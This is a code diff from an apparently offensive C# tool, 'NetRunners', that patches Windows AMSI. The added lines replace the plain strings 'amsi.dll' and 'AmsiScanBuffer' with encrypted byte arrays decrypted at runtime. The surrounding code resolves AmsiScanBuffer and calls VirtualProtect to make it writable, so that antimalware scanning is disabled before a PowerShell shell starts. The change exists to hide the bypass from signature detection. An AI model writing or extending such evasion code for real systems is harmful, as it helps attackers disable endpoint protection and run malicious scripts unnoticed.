@@ -2,6 +2,7 @@
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using static NetRunners.Data.Delegates;
+using static NetRunners.Data.Encrypted;
 
 namespace NetRunnersClm
 {
@@ -45,8 +46,8 @@ namespace NetRunnersClm
 
             // Before we start powershell, we nullify AmsiScanBuffer as well. This ensures AMSI doesn't plague
             // us in our new shell.
-            var amsi = LoadLibraryA("amsi.dll");
-            var AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
+            var amsi = LoadLibraryA(Decrypt(amsidll_Byte));
+            var AmsiScanBuffer = GetProcAddress(amsi, Decrypt(AmsiScanBuffer_Byte));
             VirtualProtect(AmsiScanBuffer, new UIntPtr(8), 0x40, out lpflOldProtect);
 
             // Stolen from https://github.com/rasta-mouse/AmsiScanBufferBypass
